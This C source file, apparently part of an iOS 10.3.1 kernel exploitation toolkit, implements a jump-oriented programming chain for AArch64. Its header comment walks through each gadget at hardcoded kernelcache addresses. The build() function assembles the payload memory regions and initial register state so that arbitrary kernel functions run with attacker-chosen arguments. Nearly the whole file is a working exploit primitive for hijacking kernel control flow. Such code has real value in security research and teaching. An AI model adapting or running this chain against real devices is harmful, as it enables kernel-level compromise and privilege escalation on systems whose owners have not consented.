/*
 * Copyright (c) 2017 Brandon Azad
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in
 * all copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
 * THE SOFTWARE.
 */
/*
 * AArch64 Kernel Function Call Strategy 4
 * ---------------------------------------
 *
 *  See the file call_strategy_3.c for the general motivation and design of this JOP kernel
 *  function call program.
 *
 *  Some gadgets used by strategy 3 are missing from the iOS 10.3.1 kernelcache binary. This
 *  strategy is a slight tweak to strategy 3 that substitutes the missing gadgets.
 *
 *  The listing below is a complete description of the code executed in the kernel to perform the
 *  function call, starting from kernel_call_7. Note that we only need the first 2 arguments (x0
 *  and x1).
 *
 *  -----------------------------------------------------------------------------------------------
 *
 *  	kernel_call_2
 *  		POPULATE_VALUES = {
 *  			  0: REGION_1
 *  			  8: ARGUMENTS_2_TO_11
 *  			 10: FUNCTION
 *  			 18: ARGUMENT_1
 *  			 20: ARGUMENT_0
 *  			 28
 *  			 30: ARGUMENT_12
 *  			 38: GADGET_CALL_FUNCTION_1
 *  			 40: ARGUMENT_13
 *  			 48: GADGET_POPULATE_2
 *  			 c0: JOP_STACK_2
 *  			218: REGION_2
 *  		}
 *  		REGION_1 = {
 *  			 a0: JOP_DISPATCH
 *  			 d0: GADGET_STORE_RESULT_1
 *  			390: JOP_DISPATCH
 *  		}
 *  		ARGUMENTS_2_TO_11 = {
 *  			 0: ARGUMENT_2
 *  			 8: ARGUMENT_3
 *  			10: ARGUMENT_4
 *  			18: ARGUMENT_5
 *  			20: ARGUMENT_6
 *  			28: ARGUMENT_7
 *  			30: ARGUMENT_8
 *  			38: ARGUMENT_9
 *  			40: ARGUMENT_10
 *  			48: ARGUMENT_11
 *  		}
 *  		REGION_2 = {
 *  			0: REGION_3
 *  		}
 *  		REGION_3 = {
 *  			140: GADGET_EPILOGUE_2
 *  		}
 *  		JOP_STACK_1 = [
 *  			MOV_X23_X0__BLR_X8,
 *  			GADGET_INITIALIZE_X20_1,
 *  			MOV_X25_X19__BLR_X8,
 *  			GADGET_POPULATE_2,
 *  		]
 *  		JOP_STACK_2 = [
 *  			MOV_X19_X9__BR_X8,
 *  			MOV_X20_X19__BR_X8,
 *  			MOV_X5_X6__BLR_X8,
 *  			MOV_X19_X5__BLR_X8,
 *  			MOV_X21_X11__BLR_X8,
 *  			MOV_X22_X9__BLR_X8,
 *  			MOV_X0_X3__BLR_X8,
 *  			MOV_X23_X0__BLR_X8,
 *  			MOV_X24_X4__BR_X8,
 *  			MOV_X8_X10__BR_X12,
 *  		]
 *  		x0 = POPULATE_VALUES
 *  		x1 = JOP_STACK_1
 *  		pc = GADGET_PROLOGUE_2
 *
 *  	GADGET_PROLOGUE_2 (0xfffffff006719200):
 *  			;; Save registers x19-x28, save the frame (x29, x30), and
 *  			;; make room for 0x40 bytes of local variables. sp must be
 *  			;; preserved.
 *  			sub sp, sp, #0xa0
 *  			stp x28, x27, [sp, #0x40]
 *  			stp x26, x25, [sp, #0x50]
 *  			stp x24, x23, [sp, #0x60]
 *  			stp x22, x21, [sp, #0x70]
 *  			stp x20, x19, [sp, #0x80]
 *  			stp x29, x30, [sp, #0x90]
 *  			add x29, sp, #0x90
 *  			mov x19, x0
 *  			ldr x8, [x19]
 *  			ldr x8, [x8, #0x390]
 *  			blr x8
 *  		SAVE_REGISTERS(x19, ..., x28)
 *  		x29 = STACK_FRAME()
 *  		RESERVE_STACK(0x40)
 *  		x19 = POPULATE_VALUES
 *  		x8 = POPULATE_VALUES[0] = REGION_1
 *  		x8 = REGION_1[0x390] = JOP_DISPATCH
 *  		pc = JOP_DISPATCH
 *
 *  	;; Just after the prologue we have the following register values:
 *  	;; 	x0 = POPULATE_VALUES
 *  	;; 	x1 = JOP_STACK_1
 *  	;; 	x8 = JOP_DISPATCH
 *  	;; 	x19 = POPULATE_VALUES
 *  	;; 	x29 = STACK_FRAME
 *  	;; We will populate registers using GADGET_POPULATE_2. Since we're
 *  	;; using this gadget with JOP_DISPATCH, we first need to initialize x20
 *  	;; to JOP_STACK_2 and x23 to POPULATE_VALUES.
 *
 *  	JOP_DISPATCH (0xfffffff006b5d8cc):
 *  			ldp x2, x1, [x1]
 *  			br x2
 *  		x2 = MOV_X23_X0__BLR_X8
 *  		pc = MOV_X23_X0__BLR_X8
 *
 *  	MOV_X23_X0__BLR_X8 (0xfffffff006426efc):
 *  			mov x23, x0
 *  			blr x8
 *  		x23 = POPULATE_VALUES
 *  		pc = JOP_DISPATCH
 *  		x2 = GADGET_INITIALIZE_X20_1
 *  		pc = GADGET_INITIALIZE_X20_1
 *
 *  	GADGET_INITIALIZE_X20_1 (0xfffffff00662bd28):
 *  			;; This is a hack to get x20 to point to JOP_STACK_2 before
 *  			;; using GADGET_POPULATE_2.
 *  			ldr x20, [x19, #0xc0]
 *  			ldr x8, [x0]
 *  			ldr x8, [x8, #0xa0]
 *  			blr x8
 *  		x20 = POPULATE_VALUES[0xc0] = JOP_STACK_2
 *  		x8 = POPULATE_VALUES[0] = REGION_1
 *  		x8 = REGION_1[0xa0] = JOP_DISPATCH
 *  		pc = JOP_DISPATCH
 *  		x2 = MOV_X25_X19__BLR_X8
 *  		pc = MOV_X25_X19__BLR_X8
 *
 *  	;; We're about to execute GADGET_POPULATE_2. We want to fill the
 *  	;; following registers:
 *  	;; 	x19 = ARGUMENT_0
 *  	;; 	x20 = ARGUMENT_1
 *  	;; 	x21 = ARGUMENT_13
 *  	;; 	x22 = ARGUMENT_12
 *  	;; 	x23 = ARGUMENTS_2_TO_11
 *  	;;	x24 = FUNCTION
 *  	;; 	x25 = POPULATE_VALUES (CALL_RESUME)
 *  	;; Last of all we want to set:
 *  	;; 	x8 = GADGET_CALL_FUNCTION_1
 *  	;; 	pc = GADGET_POPULATE_2
 *  	;; Since we already have POPULATE_VALUES in x19, we'll set that now.
 *
 *  	MOV_X25_X19__BLR_X8 (0xfffffff006a086ac):
 *  			mov x25, x19
 *  			br x8
 *  		x25 = POPULATE_VALUES
 *  		pc = JOP_DISPATCH
 *  		x2 = GADGET_POPULATE_2
 *  		pc = GADGET_POPULATE_2
 *
 *  	GADGET_POPULATE_2 (0xfffffff006d3ef20):
 *  			ldp x2, x3, [x23]
 *  			ldp x4, x5, [x23, #0x10]
 *  			ldp x6, x7, [x23, #0x20]
 *  			ldp x9, x10, [x23, #0x30]
 *  			ldp x11, x12, [x23, #0x40]
 *  			stp x22, x21, [sp, #0x20]
 *  			stp x11, x12, [sp, #0x10]
 *  			stp x9, x10, [sp]
 *  			mov x0, x19
 *  			mov x1, x20
 *  			blr x8
 *  		x0 = POPULATE_VALUES
 *  		x1 = JOP_STACK_2
 *  		x2 = POPULATE_VALUES[0] = REGION_1
 *  		x3 = POPULATE_VALUES[0x8] = ARGUMENTS_2_TO_11
 *  		x4 = POPULATE_VALUES[0x10] = FUNCTION
 *  		x5 = POPULATE_VALUES[0x18] = ARGUMENT_1
 *  		x6 = POPULATE_VALUES[0x20] = ARGUMENT_0
 *  		x7 = POPULATE_VALUES[0x28]
 *  		x9 = POPULATE_VALUES[0x30] = ARGUMENT_12
 *  		x10 = POPULATE_VALUES[0x38] = GADGET_CALL_FUNCTION_1
 *  		x11 = POPULATE_VALUES[0x40] = ARGUMENT_13
 *  		x12 = POPULATE_VALUES[0x48] = GADGET_POPULATE_2
 *  		pc = JOP_DISPATCH
 *  		x2 = MOV_X19_X9__BR_X8
 *  		pc = MOV_X19_X9__BR_X8
 *
 *  	MOV_X19_X5__BLR_X8 (0xfffffff0074a98c4):
 *  			mov x19, x5
 *  			blr x8
 *  		x19 = ARGUMENT_1
 *  		pc = JOP_DISPATCH
 *  		x2 = MOV_X20_X19__BR_X8
 *  		pc = MOV_X20_X19__BR_X8
 *
 *  	MOV_X20_X19__BR_X8 (0xfffffff0068345ac):
 *  			mov x20, x19
 *  			br x8
 *  		x20 = ARGUMENT_1
 *  		pc = JOP_DISPATCH
 *  		x2 = MOV_X5_X6__BLR_X8
 *  		pc = MOV_X5_X6__BLR_X8
 *
 *  	MOV_X5_X6__BLR_X8 (0xfffffff0066392a8):
 *  			mov x5, x6
 *  			blr x8
 *  		x5 = ARGUMENT_0
 *  		pc = JOP_DISPATCH
 *  		x2 = MOV_X19_X5__BLR_X8
 *  		pc = MOV_X19_X5__BLR_X8
 *
 *  	MOV_X19_X5__BLR_X8 (0xfffffff0074a98c4):
 *  			mov x19, x5
 *  			blr x8
 *  		x19 = ARGUMENT_0
 *  		pc = JOP_DISPATCH
 *  		x2 = MOV_X21_X11__BLR_X8
 *  		pc = MOV_X21_X11__BLR_X8
 *
 *  	MOV_X21_X11__BLR_X8 (0xfffffff00749e324):
 *  			mov x21, x11
 *  			blr x8
 *  		x21 = ARGUMENT_13
 *  		pc = JOP_DISPATCH
 *  		x2 = MOV_X22_X9__BLR_X8
 *  		pc = MOV_X22_X9__BLR_X8
 *
 *  	MOV_X22_X9__BLR_X8 (0xfffffff0064399bc):
 *  			mov x22, x9
 *  			blr x8
 *  		x22 = ARGUMENT_12
 *  		pc = JOP_DISPATCH
 *  		x2 = MOV_X0_X3__BLR_X8
 *  		pc = MOV_X0_X3__BLR_X8
 *
 *  	MOV_X0_X3__BLR_X8 (0xfffffff00721e278):
 *  			mov x0, x3
 *  			blr x8
 *  		x0 = ARGUMENTS_2_TO_11
 *  		pc = JOP_DISPATCH
 *  		x2 = MOV_X23_X0__BLR_X8
 *  		pc = MOV_X23_X0__BLR_X8
 *
 *  	MOV_X23_X0__BLR_X8 (0xfffffff006426efc):
 *  			mov x23, x0
 *  			blr x8
 *  		x23 = ARGUMENTS_2_TO_11
 *  		pc = JOP_DISPATCH
 *  		x2 = MOV_X24_X4__BR_X8
 *  		pc = MOV_X24_X4__BR_X8
 *
 *  	MOV_X24_X4__BR_X8 (0xfffffff0069dc86c):
 *  			mov x24, x4
 *  			br x8
 *  		x24 = FUNCTION
 *  		pc = JOP_DISPATCH
 *  		x2 = MOV_X8_X10__BR_X12
 *  		pc = MOV_X8_X10__BR_X12
 *
 *  	MOV_X8_X10__BR_X12 (0xfffffff006960b94):
 *  			mov x8, x10
 *  			br x12
 *  		x8 = GADGET_CALL_FUNCTION_1
 *  		pc = GADGET_POPULATE_2
 *
 *  	;; At this point, we have set the following registers:
 *  	;; 	x8 = GADGET_CALL_FUNCTION_1
 *  	;; 	x19 = ARGUMENT_0
 *  	;; 	x20 = ARGUMENT_1
 *  	;; 	x21 = ARGUMENT_13
 *  	;; 	x22 = ARGUMENT_12
 *  	;; 	x23 = ARGUMENTS_2_TO_11
 *  	;;	x24 = FUNCTION
 *  	;; 	x25 = POPULATE_VALUES
 *  	;; 	pc = GADGET_POPULATE_2
 *
 *  	GADGET_POPULATE_2 (0xfffffff006d3ef20):
 *  			ldp x2, x3, [x23]
 *  			ldp x4, x5, [x23, #0x10]
 *  			ldp x6, x7, [x23, #0x20]
 *  			ldp x9, x10, [x23, #0x30]
 *  			ldp x11, x12, [x23, #0x40]
 *  			stp x22, x21, [sp, #0x20]
 *  			stp x11, x12, [sp, #0x10]
 *  			stp x9, x10, [sp]
 *  			mov x0, x19
 *  			mov x1, x20
 *  			blr x8
 *  		x0 = ARGUMENT_0
 *  		x1 = ARGUMENT_1
 *  		x2 = ARGUMENT_2
 *  		x3 = ARGUMENT_3
 *  		x4 = ARGUMENT_4
 *  		x5 = ARGUMENT_5
 *  		x6 = ARGUMENT_6
 *  		x7 = ARGUMENT_7
 *  		x9 = ARGUMENT_8
 *  		x10 = ARGUMENT_9
 *  		x11 = ARGUMENT_10
 *  		x12 = ARGUMENT_11
 *  		STACK = [ARGUMENT_8, ARGUMENT_9, ARGUMENT_10, ARGUMENT_11, ARGUMENT_12, ARGUMENT_13, ?, ?]
 *  		pc = GADGET_CALL_FUNCTION_1
 *
 *  	;; Now all the arguments are set up correctly and we will execute
 *  	;; GADGET_CALL_FUNCTION_1. The following gadget allows us to resume
 *  	;; execution after the function call without messing with x30.
 *
 *  	GADGET_CALL_FUNCTION_1 (0xfffffff007495520):
 *  			blr x24
 *  			mov x19, x0
 *  			ldr x8, [x25]
 *  			ldr x8, [x8, #0xd0]
 *  			mov x0, x25
 *  			blr x8
 *  		pc = FUNCTION
 *  		x0 = FUNCTION_RETURN
 *  		x19 = FUNCTION_RETURN
 *  		x8 = POPULATE_VALUES[0] = REGION_1
 *  		x8 = REGION_1[0xd0] = GADGET_STORE_RESULT_1
 *  		x0 = POPULATE_VALUES
 *  		pc = GADGET_STORE_RESULT_1
 *
 *  	GADGET_STORE_RESULT_1 (0xfffffff00683e910):
 *  			str x19, [x0, #0x238]
 *  			ldr x0, [x0, #0x218]
 *  			ldr x8, [x0]
 *  			ldr x8, [x8, #0x140]
 *  			blr x8
 *  		POPULATE_VALUES[0x238] = FUNCTION_RETURN
 *  		x0 = POPULATE_VALUES[0x218] = REGION_2
 *  		x8 = REGION_2[0] = REGION_3
 *  		x8 = REGION_3[0x140] = GADGET_EPILOGUE_2
 *  		pc = GADGET_EPILOGUE_2
 *
 *  	GADGET_EPILOGUE_2 (0xfffffff0070a9ebc):
 *  			;; Reset stack to entry conditions and return to caller.
 *  			;; sp must have been preserved from the prologue.
 *  			ldp x29, x30, [sp, #0x90]
 *  			ldp x20, x19, [sp, #0x80]
 *  			ldp x22, x21, [sp, #0x70]
 *  			ldp x24, x23, [sp, #0x60]
 *  			ldp x26, x25, [sp, #0x50]
 *  			ldp x28, x27, [sp, #0x40]
 *  			add sp, sp, #0xa0
 *  			ret
 *  		RESTORE_REGISTERS(x19, ..., x28)
 *  		pc = CALLER
 *
 *  -----------------------------------------------------------------------------------------------
 *
 *  There are two JOP_STACK sequences:
 *
 *  	JOP_STACK_1 (4):
 *  		MOV_X23_X0__BLR_X8
 *  		GADGET_INITIALIZE_X20_1
 *  		MOV_X25_X19__BLR_X8
 *  		GADGET_POPULATE_2
 *
 *  	JOP_STACK_2 (10):
 *  		MOV_X19_X9__BR_X8
 *  		MOV_X20_X19__BR_X8
 *  		MOV_X5_X6__BLR_X8
 *  		MOV_X19_X5__BLR_X8
 *  		MOV_X21_X11__BLR_X8
 *  		MOV_X22_X9__BLR_X8
 *  		MOV_X0_X3__BLR_X8
 *  		MOV_X23_X0__BLR_X8
 *  		MOV_X24_X4__BR_X8
 *  		MOV_X8_X10__BR_X12
 *
 *  We can lay out memory as follows:
 *
 *  	         0   1   2   3   4   5   6   7   8   9   a   b   c   d   e   f
 *  	        +----------------------------------------------------------------+
 *  	      0 |BBAAAAAAAAAABBAAAAAAAACCCCCCCCCCCCCCCCCCCCDDEE    AA            |
 *  	    100 |JJJJJJJJJJJJJJJJKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKK        |
 *  	    200 |        AA      **                                          BB  |
 *  	        +----------------------------------------------------------------+
 *  	         0   1   2   3   4   5   6   7   8   9   a   b   c   d   e   f
 *
 *  	        A = POPULATE_VALUES   =   0 - 220 @   8
 *  	        * = RESULT            =   0 - 8   @ 238 + POPULATE_VALUES
 *  	        B = REGION_1          =  a0 - 398 @ -a0
 *  	        C = ARGUMENTS_2_TO_11 =   0 - 50  @  58
 *  	        D = REGION_2          =   0 - 8   @  a8
 *  	        E = REGION_3          = 140 - 148 @ -90
 *
 *  	        J = JOP_STACK_1       =   0 - 40  @ 100
 *  	        K = JOP_STACK_2       =   0 - a0  @ 140
 *
 *  While there is a lot of free space, it is not possible to significantly compact the JOP
 *  program's memory footprint because REGION_1 (B in the diagram) has such a wide span.
 *
 */

#include "call_strategy.h"

#include "offsets.h"

#include <stdio.h>
#include <unistd.h>


//static bool check(void);
static void build(uint64_t, const uint64_t[8], uint64_t,
		void *, struct jop_call_initial_state *, uint64_t *);

/*
 * jop_call_strategy_4
 *
 * Description:
 * 	The JOP payload described at the top of this file.
 *
 * Capabilities:
 * 	Supports 8 arguments passed in registers and 48 bytes of stack arguments.
 */
struct jop_call_strategy jop_call_strategy_4 = {
	0x300, 0x30 /*, check*/, build,
};

#define JOP_OFFSET(gadget)	(OFFSET(jop_##gadget))
#define JOP_GADGET(gadget)	(offsets_get_kernel_base() + JOP_OFFSET(gadget))



/*
 
 this strategy requires the following:
 
 MOV_X23_X0__BLR_X8
 GADGET_INITIALIZE_X20_1
 MOV_X25_X19__BLR_X8
 GADGET_POPULATE_2
 MOV_X19_X9__BR_X8
 MOV_X20_X19__BR_X8
 MOV_X5_X6__BLR_X8
 MOV_X19_X5__BLR_X8
 MOV_X21_X11__BLR_X8
 MOV_X22_X9__BLR_X8
 MOV_X0_X3__BLR_X8
 MOV_X24_X4__BR_X8
 MOV_X8_X10__BR_X12
 GADGET_PROLOGUE_2
 GADGET_EPILOGUE_2
 LDP_X2_X1_X1__BR_X2
 GADGET_STORE_RESULT_1
 GADGET_CALL_FUNCTION_1
 
*/

static void
build(uint64_t func, const uint64_t args[14], uint64_t kernel_payload,
		void *payload0, struct jop_call_initial_state *initial_state,
		uint64_t *result_address) {
	uint8_t *payload = payload0;

	// Define the offsets from the start of the payload to each of the structures.
	const ssize_t POPULATE_VALUES_OFFSET   =    0x8;
	const ssize_t RESULT_OFFSET            =  0x238 + POPULATE_VALUES_OFFSET;
	const ssize_t REGION_1_OFFSET          = - 0xa0;
	const ssize_t ARGUMENTS_2_TO_11_OFFSET =   0x58;
	const ssize_t REGION_2_OFFSET          =   0xa8;
	const ssize_t REGION_3_OFFSET          = - 0x90;
	const ssize_t JOP_STACK_1_OFFSET       =  0x100;
	const ssize_t JOP_STACK_2_OFFSET       =  0x140;

	// Get the addresses of each region in the local buffer.
	uint8_t *payload_POPULATE_VALUES   = payload + POPULATE_VALUES_OFFSET;
	uint8_t *payload_REGION_1          = payload + REGION_1_OFFSET;
	uint8_t *payload_ARGUMENTS_2_TO_11 = payload + ARGUMENTS_2_TO_11_OFFSET;
	uint8_t *payload_REGION_2          = payload + REGION_2_OFFSET;
	uint8_t *payload_REGION_3          = payload + REGION_3_OFFSET;
	uint8_t *payload_JOP_STACK_1       = payload + JOP_STACK_1_OFFSET;

	// Get the addresses of each region in the kernel.
	uint64_t kernel_POPULATE_VALUES   = kernel_payload + POPULATE_VALUES_OFFSET;
	uint64_t kernel_RESULT            = kernel_payload + RESULT_OFFSET;
	uint64_t kernel_REGION_1          = kernel_payload + REGION_1_OFFSET;
	uint64_t kernel_ARGUMENTS_2_TO_11 = kernel_payload + ARGUMENTS_2_TO_11_OFFSET;
	uint64_t kernel_REGION_2          = kernel_payload + REGION_2_OFFSET;
	uint64_t kernel_REGION_3          = kernel_payload + REGION_3_OFFSET;
	uint64_t kernel_JOP_STACK_1       = kernel_payload + JOP_STACK_1_OFFSET;
	uint64_t kernel_JOP_STACK_2       = kernel_payload + JOP_STACK_2_OFFSET;

	// Construct the POPULATE_VALUES region.
	*(uint64_t *)(payload_POPULATE_VALUES +   0x0) = kernel_REGION_1;
	*(uint64_t *)(payload_POPULATE_VALUES +   0x8) = kernel_ARGUMENTS_2_TO_11;
	*(uint64_t *)(payload_POPULATE_VALUES +  0x10) = func;
	*(uint64_t *)(payload_POPULATE_VALUES +  0x18) = args[1];
	*(uint64_t *)(payload_POPULATE_VALUES +  0x20) = args[0];
	*(uint64_t *)(payload_POPULATE_VALUES +  0x30) = args[12];
	*(uint64_t *)(payload_POPULATE_VALUES +  0x38) = JOP_GADGET(GADGET_CALL_FUNCTION_1);
	*(uint64_t *)(payload_POPULATE_VALUES +  0x40) = args[13];
	*(uint64_t *)(payload_POPULATE_VALUES +  0x48) = JOP_GADGET(GADGET_POPULATE_2);
	*(uint64_t *)(payload_POPULATE_VALUES +  0xc0) = kernel_JOP_STACK_2;
	*(uint64_t *)(payload_POPULATE_VALUES + 0x218) = kernel_REGION_2;

	// Construct the REGION_1 region.
	*(uint64_t *)(payload_REGION_1 +  0xa0) = JOP_GADGET(LDP_X2_X1_X1__BR_X2);
	*(uint64_t *)(payload_REGION_1 +  0xd0) = JOP_GADGET(GADGET_STORE_RESULT_1);
	*(uint64_t *)(payload_REGION_1 + 0x390) = JOP_GADGET(LDP_X2_X1_X1__BR_X2);

	// Construct the ARGUMENTS_2_TO_11 region.
	*(uint64_t *)(payload_ARGUMENTS_2_TO_11 +   0x0) = args[2];
	*(uint64_t *)(payload_ARGUMENTS_2_TO_11 +   0x8) = args[3];
	*(uint64_t *)(payload_ARGUMENTS_2_TO_11 +  0x10) = args[4];
	*(uint64_t *)(payload_ARGUMENTS_2_TO_11 +  0x18) = args[5];
	*(uint64_t *)(payload_ARGUMENTS_2_TO_11 +  0x20) = args[6];
	*(uint64_t *)(payload_ARGUMENTS_2_TO_11 +  0x28) = args[7];
	*(uint64_t *)(payload_ARGUMENTS_2_TO_11 +  0x30) = args[8];
	*(uint64_t *)(payload_ARGUMENTS_2_TO_11 +  0x38) = args[9];
	*(uint64_t *)(payload_ARGUMENTS_2_TO_11 +  0x40) = args[10];
	*(uint64_t *)(payload_ARGUMENTS_2_TO_11 +  0x48) = args[11];

	// Construct the REGION_2 region.
	*(uint64_t *)(payload_REGION_2 +   0x0) = kernel_REGION_3;

	// Construct the REGION_3 region.
	*(uint64_t *)(payload_REGION_3 + 0x140) = JOP_GADGET(GADGET_EPILOGUE_2);

	// Construct the JOP stacks. We can merge them together during construction, since the link
	// from JOP_STACK_1 to JOP_STACK_2 will be ignored during execution anyway.
	struct DISPATCH_NODE {
		uint64_t x2;
		uint64_t x1;
	} *payload_DISPATCH_NODE = (void *) payload_JOP_STACK_1;
	uint64_t kernel_next_node = kernel_JOP_STACK_1;
#define JOP_CHAIN_ADD(gadget)							\
		kernel_next_node += sizeof(*payload_DISPATCH_NODE);		\
		payload_DISPATCH_NODE->x2 = JOP_GADGET(gadget);			\
		payload_DISPATCH_NODE->x1 = kernel_next_node;			\
		payload_DISPATCH_NODE++;
	// JOP_STACK_1
	JOP_CHAIN_ADD(MOV_X23_X0__BLR_X8);
	JOP_CHAIN_ADD(GADGET_INITIALIZE_X20_1);
	JOP_CHAIN_ADD(MOV_X25_X19__BLR_X8);
	JOP_CHAIN_ADD(GADGET_POPULATE_2);
	// JOP_STACK_2
	JOP_CHAIN_ADD(MOV_X19_X9__BR_X8);
	JOP_CHAIN_ADD(MOV_X20_X19__BR_X8);
	JOP_CHAIN_ADD(MOV_X5_X6__BLR_X8);
	JOP_CHAIN_ADD(MOV_X19_X5__BLR_X8);
	JOP_CHAIN_ADD(MOV_X21_X11__BLR_X8);
	JOP_CHAIN_ADD(MOV_X22_X9__BLR_X8);
	JOP_CHAIN_ADD(MOV_X0_X3__BLR_X8);
	JOP_CHAIN_ADD(MOV_X23_X0__BLR_X8);
	JOP_CHAIN_ADD(MOV_X24_X4__BR_X8);
	JOP_CHAIN_ADD(MOV_X8_X10__BR_X12);
#undef JOP_CHAIN_ADD

	// Set the initial arguments.
	initial_state->pc   = JOP_GADGET(GADGET_PROLOGUE_2);
	initial_state->x[0] = kernel_POPULATE_VALUES;
	initial_state->x[1] = kernel_JOP_STACK_1;

	// Set the address at which the result will be stored.
	*result_address = kernel_RESULT;
}
